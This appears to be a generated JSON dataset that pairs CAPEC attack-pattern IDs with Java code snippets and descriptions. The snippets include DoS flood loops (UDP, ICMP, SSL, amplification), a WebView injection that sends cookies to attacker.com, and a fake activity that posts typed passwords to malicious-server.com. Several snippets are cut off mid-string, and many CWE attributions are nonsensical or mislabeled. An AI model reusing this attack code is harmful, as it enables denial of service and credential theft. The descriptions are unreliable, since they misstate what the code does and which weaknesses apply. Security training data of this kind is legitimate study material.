        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_ip\");\n        byte[] data = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(data, data.length, address, 53);\n\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP flood attack, which can be used to overwhelm a target system by sending a large volume of UDP packets. The code creates a DatagramSocket and sends UDP packets to a target IP address and port 53 (DNS) in an infinite loop, without any throttling or restrictions. This can lead to a denial-of-service (DoS) attack, as the target system may become overwhelmed and unable to respond to legitimate requests. The code also lacks proper error handling and does not ensure the integrity of the transmitted data, making it vulnerable to CWE-319 (Cleartext Transmission of Sensitive Information), CWE-406 (Insufficient Control of Network Message Volume), CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "487",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ICMPFloodAttack {\n    public static void main(String[] args) {\n        ExecutorService executor = Executors.newCachedThreadPool();\n        for (int i = 0; i < 1000; i++) {\n            executor.execute(new ICMPFlooder());\n        }\n    }\n}\n\nclass ICMPFlooder implements Runnable {\n    public void run() {\n        try {\n            InetAddress address = InetAddress.getByName(\\",
        "description": "This Java code snippet demonstrates an ICMP flooding attack, which can be used to deny legitimate users access to a service by consuming available network bandwidth. The code creates a large number of threads, each sending ICMP packets to a victim server at a high rate, with spoofed source IP addresses. The code lacks throttling or limits on the number of packets sent, making it vulnerable to CWE-770. Additionally, the code does not correctly specify the intended destination for the packets, making it vulnerable to CWE-941. The code also lacks assertions to check for invalid packets, making it vulnerable to CWE-617. Furthermore, the code sends sensitive information in cleartext, making it vulnerable to CWE-319, and does not properly restrict the communication channel, making it vulnerable to CWE-923."
    },
    {
        "capec_id": "488",
        "code_snippet": "public class VulnerableServer {\n    private static final int MAX_CONCURRENT_REQUESTS = 100;\n    private static final int MAX_REQUEST_SIZE = 1024;\n    private static final String SENSITIVE_INFO = \"secret_key\";\n\n    public static void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        String queryString = request.getQueryString();\n        if (queryString != null && queryString.contains(SENSITIVE_INFO)) {\n            // Process sensitive information in query string\n            processSensitiveInfo(queryString);\n        }\n\n        // No throttling or limits on resource allocation\n        for (int i = 0; i < MAX_CONCURRENT_REQUESTS; i++) {\n            allocateResource(request);\n        }\n\n        // Inconsistent interpretation of HTTP requests\n        String userAgent = request.getHeader(\"User-Agent\");\n        if (userAgent != null && userAgent.contains(\"MaliciousClient\")) {\n            // Process request differently based on User-Agent header\n            processMaliciousRequest(request);\n        }\n\n        // Server-Side Request Forgery (SSRF)\n        String url = request.getParameter(\"url\");\n        if (url != null) {\n            sendRequestToUrl(url);\n        }\n    }\n\n    private static void allocateResource(HttpServletRequest request) {\n        // Allocate resource without limits or throttling\n        byte[] buffer = new byte[MAX_REQUEST_SIZE];\n        // Use the allocated resource\n    }\n\n    private static void processSensitiveInfo(String queryString) {\n        // Process sensitive information in query string\n    }\n\n    private static void processMaliciousRequest(HttpServletRequest request) {\n        // Process request differently based on User-Agent header\n    }\n\n    private static void sendRequestToUrl(String url) {\n        // Send request to URL without validating the destination\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable server that is susceptible to HTTP flooding attacks. It lacks throttling or limits on resource allocation, uses the GET request method with sensitive query strings, and is vulnerable to inconsistent interpretation of HTTP requests, Server-Side Request Forgery (SSRF), and insufficient resource pool."
    },
    {
        "capec_id": "489",
        "code_snippet": "import java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\n\npublic class SSLFloodAttack {\n    public static void main(String[] args) {\n        int numConnections = 1000;\n        URL url = new URL(\"https://example.com\");\n        for (int i = 0; i < numConnections; i++) {\n            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.connect();\n            // Renegotiate the SSL connection\n            connection.startHandshake();\n            connection.disconnect();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a potential SSL flooding attack, which can lead to denial of service (DoS) by consuming all available resources on the server side. The code creates a large number of HTTPS connections to a target server, renegotiating the SSL connection for each request, without any throttling or limits. This can cause the server to exhaust its resources, leading to a crash or loss of service to legitimate users."
    },
    {
        "capec_id": "490",
        "code_snippet": "public class AmplificationAttack {\n    public static void main(String[] args) {\n        String targetServer = \"target-server.com\";\n        String thirdPartyService = \"third-party-service.com\";\n        int numRequests = 1000;\n\n        for (int i = 0; i < numRequests; i++) {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            sendRequest(thirdPartyService, targetServer);\n        }\n    }\n\n    public static void sendRequest(String thirdPartyService, String targetServer) {\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        // No limits on the number of requests or response size\n        URL url = new URL(\"http://\" + thirdPartyService + \"/large-response\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestProperty(\"X-Forwarded-For\", targetServer);\n        connection.connect();\n\n        // CWE-405: Asymmetric Resource Consumption (Amplification)\n        // No control over the size of the response\n        int responseCode = connection.getResponseCode();\n        if (responseCode == 200) {\n            // CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\n            // No monitoring or control over the transmitted network traffic volume\n            byte[] responseBytes = new byte[1024 * 1024]; // 1MB response\n            InputStream inputStream = connection.getInputStream();\n            inputStream.read(responseBytes);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an amplification attack, where an adversary sends a large number of requests to a third-party service, spoofing the source address to be that of the target server. The third-party service responds with a large payload, which is then sent to the target server, overwhelming it with traffic. The code lacks limits on resource allocation, throttling, and control over network message volume, making it vulnerable to amplification attacks."
    },
    {
        "capec_id": "491",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        String largeEntity = \"\";\n        for (int i = 0; i < 1000000; i++) {\n            largeEntity += \"a\";\n        }\n        String template = \"${largeEntity}\";\n        for (int i = 0; i < 100; i++) {\n            template += template;\n        }\n        String result = template.replace(\"$\", \"\");\n        System.out.println(result);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC-196 attack pattern, where an adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The code creates a large entity and uses it multiple times in a single entity substitution, leading to uncontrolled memory allocation and potential application crash or freeze."
    },
    {
        "capec_id": "492",
        "code_snippet": "public class RegexVulnerability {\n    public static void main(String[] args) {\n        String regex = \\",
        "description": "This Java code snippet demonstrates a vulnerable regular expression implementation that can lead to uncontrolled resource consumption (CWE-400) and inefficient regular expression complexity (CWE-1333). The regular expression '(a+)*' has an exponential worst-case computational complexity, which can cause the program to consume excessive CPU cycles and eventually lead to a stack overflow error. The input string is crafted to trigger this vulnerability, and the program does not properly control the allocation and maintenance of resources, making it susceptible to an attack."
    },
    {
        "capec_id": "493",
        "code_snippet": "import java.io.ByteArrayInputStream; import java.io.StringReader; import javax.xml.soap.SOAPConnection; import javax.xml.soap.SOAPConnectionFactory; import javax.xml.soap.SOAPElement; import javax.xml.soap.SOAPEnvelope; import javax.xml.soap.SOAPMessage; import javax.xml.soap.SOAPPart; import javax.xml.transform.Source; import javax.xml.transform.stream.StreamSource; public class SOAPArrayDeclarationAttack { public static void main(String[] args) throws Exception { SOAPConnectionFactory soapConnectionFactory = SOAPConnectionFactory.newInstance(); SOAPConnection soapConnection = soapConnectionFactory.createConnection(); String request = \\",
        "description": "This Java code snippet demonstrates a SOAP array declaration attack, which targets the exhaustion of memory resources of a web service. The code creates a SOAP message with a large array declaration (1,000,000 elements) and sends it to the web service. The lack of validation or limit on the array size or elements (CWE-770) can lead to memory exhaustion. Additionally, the code does not restrict the size of the XML message (CWE-130) and does not properly control sequential memory allocation (CWE-1325). The web service may also expose sensitive information through its WSDL file (CWE-651) and may be vulnerable to XML external entity injection (CWE-611)."
    },
    {
        "capec_id": "494",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream os = socket.getOutputStream();\n        InputStream is = socket.getInputStream();\n\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = is.read(buffer)) != -1) {\n            os.write(buffer, 0, bytesRead);\n        }\n\n        // CWE-404: Improper Resource Shutdown or Release\n        // socket is not closed properly\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        String maliciousRequest = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\";\n        byte[] requestBytes = maliciousRequest.getBytes();\n        os.write(requestBytes, 0, requestBytes.length);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"username=password\";\n        os.write(sensitiveData.getBytes());\n\n        // CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n        // accessing alternate data stream without proper validation\n        File file = new File(\"malicious_file.txt:malicious_stream\");\n        FileInputStream fis = new FileInputStream(file);\n        byte[] fileBuffer = new byte[1024];\n        int bytesReadFromFile;\n        while ((bytesReadFromFile = fis.read(fileBuffer)) != -1) {\n            os.write(fileBuffer, 0, bytesReadFromFile);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP Fragmentation attack, which can be used to evade filtering rules of network controls. The code allocates resources without limits or throttling, fails to release resources properly, and transmits sensitive information in cleartext. Additionally, it handles HTTP requests inconsistently and accesses alternate data streams without proper validation."
    },
    {
        "capec_id": "495",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.zip.Deflater;\nimport java.util.zip.Inflater;\n\npublic class UDPFlood {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"target_server_ip\");\n        byte[] data = new byte[2000]; // large UDP packet\n        Deflater deflater = new Deflater();\n        deflater.setInput(data);\n        deflater.finish();\n        byte[] compressedData = new byte[2000];\n        int compressedDataLength = deflater.deflate(compressedData);\n        DatagramPacket packet = new DatagramPacket(compressedData, compressedDataLength, address, 12345);\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP fragmentation attack, which can consume network bandwidth and server CPU resources. The code creates a large UDP packet (> 1500 bytes) and compresses it using the Deflater class, making it even larger. The packet is then sent repeatedly to the target server using a DatagramSocket, without any restrictions on the number of packets sent or resources allocated. This can lead to resource exhaustion and denial of service. The code also violates CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-404 (Improper Resource Shutdown or Release), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-406 (Insufficient Control of Network Message Volume), and CWE-409 (Improper Handling of Highly Compressed Data)."
    },
    {
        "capec_id": "496",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        InetAddress targetAddress = InetAddress.getByName(\"target_host\");\n        int fragmentSize = 8;\n        int numFragments = 1000;\n\n        // CWE-770: Allocation of Resources Without Limits or Throttling\n        for (int i = 0; i < numFragments; i++) {\n            DatagramPacket packet = new DatagramPacket(buffer, fragmentSize);\n            packet.setAddress(targetAddress);\n            packet.setPort(7); // Echo port\n            socket.send(packet);\n        }\n\n        // CWE-404: Improper Resource Shutdown or Release\n        // socket is not closed, causing resource leak\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // sending sensitive data in cleartext\n        String sensitiveData = \"secret_info\";\n        byte[] sensitiveBytes = sensitiveData.getBytes();\n        DatagramPacket sensitivePacket = new DatagramPacket(sensitiveBytes, sensitiveBytes.length);\n        sensitivePacket.setAddress(targetAddress);\n        sensitivePacket.setPort(7);\n        socket.send(sensitivePacket);\n    }\n}\n",
        "description": "This Java code snippet demonstrates an ICMP Fragmentation attack, which can cause a target host to become non-responsive or crash. The code sends a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message to a target host, consuming its resources. The code also includes CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-404 (Improper Resource Shutdown or Release), and CWE-319 (Cleartext Transmission of Sensitive Information) vulnerabilities."
    },
    {
        "capec_id": "497",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class KeyFileExplorer {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter the directory path:\");\n        String path = scanner.nextLine();\n        File dir = new File(path);\n        if (dir.isDirectory()) {\n            File[] files = dir.listFiles();\n            for (File file : files) {\n                if (file.isFile() && file.getName().endsWith(\".key\")) {\n                    System.out.println(\"Key file found: \" + file.getAbsolutePath());\n                    // Perform sensitive operations using the key file\n                }\n            }\n        } else {\n            System.out.println(\"Invalid directory path\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of probing and exploration to determine if common key files exist. The code takes a directory path as user input and searches for files with a '.key' extension. If such a file is found, it performs sensitive operations using the file. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the existence of key files to an unauthorized actor. It also relates to CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) as it accesses files in a directory that may be accessible to unauthorized actors. Additionally, it involves CWE-73 (External Control of File Name or Path) as it allows user input to control the file path. Furthermore, it is vulnerable to CWE-426 (Untrusted Search Path) as it searches for files using an externally-supplied search path. Finally, it relates to CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it relies on the file name or extension to determine the appropriate behavior."
    },
    {
        "capec_id": "498",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotExploit {\n    public static void main(String[] args) {\n        try {\n            // CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n            String screenshotDir = System.getProperty(\\",
        "description": "Java code snippet that demonstrates the CAPEC attack, where an adversary examines screenshot images created by iOS to obtain sensitive information. The code exploits CWE-359 by accessing private personal information, CWE-222 by truncating security-relevant information, CWE-319 by transmitting sensitive information in cleartext, CWE-939 by improperly authorizing custom URL scheme handlers, and CWE-497 by exposing sensitive system information to unauthorized actors."
    },
    {
        "capec_id": "499",
        "code_snippet": "public class VulnerableActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        Intent intent = new Intent(\"com.example.ACTION_SEND_DATA\");\n        intent.putExtra(\"SENSITIVE_DATA\", \"secret_info\");\n        sendBroadcast(intent);\n    }\n}\n\npublic class MaliciousReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String sensitiveData = intent.getStringExtra(\"SENSITIVE_DATA\");\n        Log.d(\"MaliciousReceiver\", \"Received sensitive data: \" + sensitiveData);\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android application that sends sensitive data using an implicit intent, which can be intercepted by a malicious application. The `VulnerableActivity` sends a broadcast intent with sensitive data, and the `MaliciousReceiver` receives the intent without any verification, allowing it to access the sensitive data."
    },
    {
        "capec_id": "500",
        "code_snippet": "public class WebViewVulnerability {\n    public void loadUrl(String url) {\n        WebView webView = new WebView();\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new Object() {\n            @JavascriptInterface\n            public void injectCode(String code) {\n                webView.loadUrl(\"javascript:\" + code);\n            }\n        }, \"injectedObject\");\n        webView.loadUrl(url);\n    }\n}\n\npublic class MaliciousApp {\n    public void injectCode(WebView webView) {\n        webView.loadUrl(\"javascript:var cookie = document.cookie; var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/stealCookie', true); xhr.send(cookie);\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable WebView component that allows an adversary to inject malicious code through a previously installed malicious application. The WebView component enables JavaScript and adds a JavaScript interface that allows the malicious app to inject code, which can manipulate the DOM tree and cookies of the page, expose sensitive information, and launch attacks against the web application from within the web page. The code embodies CWE-749 (Exposed Dangerous Method or Function), CWE-940 (Improper Verification of Source of a Communication Channel), CWE-506 (Embedded Malicious Code), CWE-784 (Reliance on Cookies without Validation and Integrity Checking in a Security Decision), and CWE-602 (Client-Side Enforcement of Server-Side Security)."
    },
    {
        "capec_id": "501",
        "code_snippet": "public class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.trusted_activity_layout);\n        // Receive implicit intent\n        Intent intent = getIntent();\n        if (intent != null) {\n            String action = intent.getAction();\n            if (action.equals(\"com.trusted.activity.ACTION\") {\n                // Mimic trusted activity's UI\n                TextView textView = findViewById(R.id.text_view);\n                textView.setText(\"Enter sensitive data:\");\n                EditText editText = findViewById(R.id.edit_text);\n                editText.setHint(\"Password\");\n                // Handle user input\n                Button button = findViewById(R.id.button);\n                button.setOnClickListener(new View.OnClickListener() {\n                    @Override\n                    public void onClick(View v) {\n                        String userInput = editText.getText().toString();\n                        // Send user input to malicious server\n                        sendToMaliciousServer(userInput);\n                    }\n                });\n            }\n        }\n    }\n\n    private void sendToMaliciousServer(String userInput) {\n        // Send user input to malicious server\n        // No verification of the communication channel\n        URL url = new URL(\"http://malicious-server.com/collectData\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        OutputStream outputStream = connection.getOutputStream();\n        outputStream.write(userInput.getBytes());\n        outputStream.close();\n    }\n}\n",
        "description": "This code snippet demonstrates a malicious Android activity that intercepts an implicit intent meant for a trusted activity. The malicious activity mimics the trusted activity's UI, prompting the user to enter sensitive data. The user input is then sent to a malicious server without proper verification of the communication channel."
    },
    {
        "capec_id": "502",
        "code_snippet": "public class VulnerableActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        IntentFilter filter = new IntentFilter(\"com.example.ACTION\");\n        registerReceiver(new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context context, Intent intent) {\n                String data = intent.getStringExtra(\"data\");\n                // Perform sensitive operation using the received data\n                performOperation(data);\n            }\n        }, filter);\n    }\n\n    private void performOperation(String data) {\n        // Sensitive operation that should only be accessible by trusted applications\n        Log.d(\"VulnerableActivity\", \"Received data: \" + data);\n    }\n}\n",
        "description": "This code snippet demonstrates a vulnerable Android application that exports a BroadcastReceiver component without proper access control or verification of intent. The BroadcastReceiver receives an intent with a specific action and performs a sensitive operation using the received data without verifying the source of the intent. This allows a malicious application to send an intent to the vulnerable application and inject data, leading to unauthorized access and potential information disclosure."
    },
    {
        "capec_id": "503",
        "code_snippet": "public class MyWebViewActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_webview);\n\n        webView = (WebView) findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        webView.addJavascriptInterface(new MyJavaScriptInterface(), \"Android\");\n\n        webView.loadUrl(\"http://example.com/malicious_page\");\n    }\n\n    public class MyJavaScriptInterface {\n        @JavascriptInterface\n        public void performSensitiveOperation() {\n            // This method is accessible from JavaScript and performs a sensitive operation\n            // such as accessing a database or making a system call\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of accessing application-specific functionality through WebView's addJavascriptInterface API. The code registers a JavaScript interface with the WebView, which allows a malicious web page to call the interface's methods, including the sensitive operation method. This code embodies CWE-284 (Improper Access Control), CWE-749 (Exposed Dangerous Method or Function), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-618 (Exposed Unsafe ActiveX Method), and CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "504",
        "code_snippet": "import java.awt.Desktop;\nimport java.io.IOException;\nimport java.net.URI;\n\npublic class MaliciousApp {\n    public static void main(String[] args) {\n        // CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n        // Create a fake login frame that mimics a legitimate application\n        JFrame fakeFrame = new JFrame(\"Login\");\n        fakeFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        fakeFrame.add(new JLabel(\"Enter credentials:\"));\n        JTextField usernameField = new JTextField();\n        JPasswordField passwordField = new JPasswordField();\n        fakeFrame.add(usernameField);\n        fakeFrame.add(passwordField);\n        fakeFrame.pack();\n        fakeFrame.setVisible(true);\n\n        // CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n        // CWE-520: .NET Misconfiguration: Use of Impersonation\n        // Impersonate a legitimate user to gain elevated privileges\n        System.setProperty(\"java.security.auth.login.config\", \"myLoginConfig.config\");\n        LoginContext loginContext = new LoginContext(\"MyLogin\", new MyLoginModule());\n        loginContext.login();\n\n        // CWE-506: Embedded Malicious Code\n        // Execute malicious code with elevated privileges\n        try {\n            Desktop desktop = Desktop.getDesktop();\n            URI uri = new URI(\"https://example.com/malicious_code\");\n            desktop.browse(uri);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-285: Improper Authorization\n        // Access sensitive resources without proper authorization\n        try {\n            // Access a sensitive file or resource\n            File sensitiveFile = new File(\"/path/to/sensitive/file\");\n            System.out.println(\"Accessed sensitive file: \" + sensitiveFile.getAbsolutePath());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious application that impersonates a legitimate task to steal sensitive information or leverage a user's privileges. It creates a fake login frame, impersonates a legitimate user to gain elevated privileges, executes malicious code, and accesses sensitive resources without proper authorization."
    },
    {
        "capec_id": "505",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MaliciousServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String targetAppUrl = req.getParameter(\"targetAppUrl\");\n        String sensitiveInfo = req.getParameter(\"sensitiveInfo\");\n        \n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        if (targetAppUrl != null && sensitiveInfo != null) {\n            // CWE-506: Embedded Malicious Code\n            String maliciousUrl = \"malicious://\" + targetAppUrl + \"?\" + sensitiveInfo;\n            \n            // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n            // No authorization check is performed\n            \n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            PrintWriter out = resp.getWriter();\n            out.println(\"<html><body><h1>Enter your credentials:</h1><form action='\" + maliciousUrl + \"'><input type='text' name='username'/><input type='password' name='password'/></form></body></html>\");\n            \n            // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n            resp.sendRedirect(maliciousUrl);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious servlet that registers for a custom URL scheme, mimics a target application, and steals sensitive user information. It incorporates multiple CWEs, including CWE-506 (Embedded Malicious Code), CWE-598 (Use of GET Request Method With Sensitive Query Strings), CWE-939 (Improper Authorization in Handler for Custom URL Scheme), CWE-209 (Generation of Error Message Containing Sensitive Information), and CWE-601 (URL Redirection to Untrusted Site ('Open Redirect'))."
    },
    {
        "capec_id": "506",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.view.View.OnClickListener;\nimport android.widget.Button;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.overlay);\n\n        Button button = (Button) findViewById(R.id.overlay_button);\n        button.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Send sensitive information in cleartext\n                Intent intent = new Intent(\"custom_url_scheme://send_credentials\");\n                startActivity(intent);\n            }\n        });\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious Android application that overlays a button on top of another application's UI, convincing the user to tap on it. The button's onClick event is handled by sending sensitive information in cleartext using a custom URL scheme, which can be sniffed by unauthorized actors. This code embodies the CAPEC and related CWEs, including CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-939 (Improper Authorization in Handler for Custom URL Scheme), CWE-451 (User Interface (UI) Misrepresentation of Critical Information), CWE-222 (Truncation of Security-relevant Information), and CWE-319 (Cleartext Transmission of Sensitive Information)."
    },
    {
        "capec_id": "507",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        try {\n            // CWE-922: Insecure Storage of Sensitive Information\n            String sensitiveInfo = \"top_secret_data\";\n            File file = new File(\"sensitive_data.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(sensitiveInfo);\n            writer.close();\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            Process process = Runtime.getRuntime().exec(\"systeminfo\");\n            System.out.println(\"System Information: \");\n            System.out.println(new String(process.getInputStream().readAllBytes()));\n\n            // CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\n            File sensitiveFile = new File(\"C:\\sensitive_data\\confidential.txt\");\n            sensitiveFile.createNewFile();\n            FileWriter sensitiveWriter = new FileWriter(sensitiveFile);\n            sensitiveWriter.write(\"confidential_data\");\n            sensitiveWriter.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the CAPEC, which is an adversary gaining physical access to a system or device. The code stores sensitive information in a file without proper access control (CWE-922), exposes system-level information to unauthorized actors (CWE-497), and stores sensitive data in a mechanism without access control (CWE-921). An adversary with physical access to the system can exploit these vulnerabilities to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "508",
        "code_snippet": "public class SensitiveInfoDisplay {\n    public static void main(String[] args) {\n        String username = \"admin\";\n        String password = \"password123\";\n        String creditCardNumber = \"1234-5678-9012-3456\";\n        System.out.println(\"Username: \" + username);\n        System.out.println(\"Password: \" + password);\n        System.out.println(\"Credit Card Number: \" + creditCardNumber);\n    }\n}\n\npublic class UnsecuredTransmission {\n    public static void sendSensitiveData(String data) {\n        Socket socket = new Socket(\"example.com\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(data.getBytes());\n        outputStream.close();\n        socket.close();\n    }\n    public static void main(String[] args) {\n        String sensitiveData = \"username=admin&password=password123\";\n        sendSensitiveData(sensitiveData);\n    }\n}\n\npublic class SystemInfoDisplay {\n    public static void main(String[] args) {\n        System.out.println(\"System Information:\");\n        System.out.println(\"OS: \" + System.getProperty(\"os.name\"));\n        System.out.println(\"Architecture: \" + System.getProperty(\"os.arch\"));\n        System.out.println(\"Username: \" + System.getProperty(\"user.name\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a shoulder surfing attack by displaying sensitive information such as usernames, passwords, and credit card numbers in plaintext, transmitting sensitive data over an unsecured connection, and exposing system-level information to unauthorized actors."
    },
    {
        "capec_id": "509",
        "code_snippet": "import java.util.Base64;\nimport javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\n\npublic class KerberosExploit {\n    public static void main(String[] args) throws Exception {\n        // CWE-522: Insufficiently Protected Credentials\n        String encryptedTicket = getEncryptedTicketFromActiveDirectory();\n        byte[] encryptedBytes = Base64.getDecoder().decode(encryptedTicket);\n\n        // CWE-308: Use of Single-factor Authentication\n        String password = \"weakpassword\";\n        byte[] passwordBytes = password.getBytes();\n\n        // CWE-309: Use of Password System for Primary Authentication\n        SecretKeySpec keySpec = new SecretKeySpec(passwordBytes, \"RC4\");\n        Cipher cipher = Cipher.getInstance(\"RC4\");\n        cipher.init(Cipher.DECRYPT_MODE, keySpec);\n        byte[] decryptedBytes = cipher.doFinal(encryptedBytes);\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String decryptedTicket = new String(decryptedBytes);\n        System.out.println(\"Decrypted Ticket: \" + decryptedTicket);\n\n        // CWE-263: Password Aging with Long Expiration\n        // CWE-262: Not Using Password Aging\n        // CWE-521: Weak Password Requirements\n        // No password aging mechanism in place, and weak password requirements allow for easy brute-forcing\n        bruteForcePassword(decryptedTicket);\n    }\n\n    public static void bruteForcePassword(String decryptedTicket) {\n        // Brute-force the password using a weak password list\n        String[] weakPasswords = {\"password123\", \"ilovejava\", \"letmein\"};\n        for (String weakPassword : weakPasswords) {\n            if (decryptedTicket.contains(weakPassword)) {\n                System.out.println(\"Cracked Password: \" + weakPassword);\n                return;\n            }\n        }\n    }\n\n    public static String getEncryptedTicketFromActiveDirectory() {\n        // Simulate getting an encrypted ticket from Active Directory\n        return \"Base64 encoded encrypted ticket\";\n    }\n}",
        "description": "Java code snippet demonstrating the exploitation of Kerberos authentication with Service Principal Names (SPNs) to obtain and crack hashed credentials of a service account. The code uses weak passwords, single-factor authentication, and lacks password aging mechanisms, making it vulnerable to brute-forcing and authentication bypass."
    },
    {
        "capec_id": "510",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SaaSApplication extends HttpServlet {\n    private static final long serialVersionUID = 1L;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userId = req.getParameter(\\",
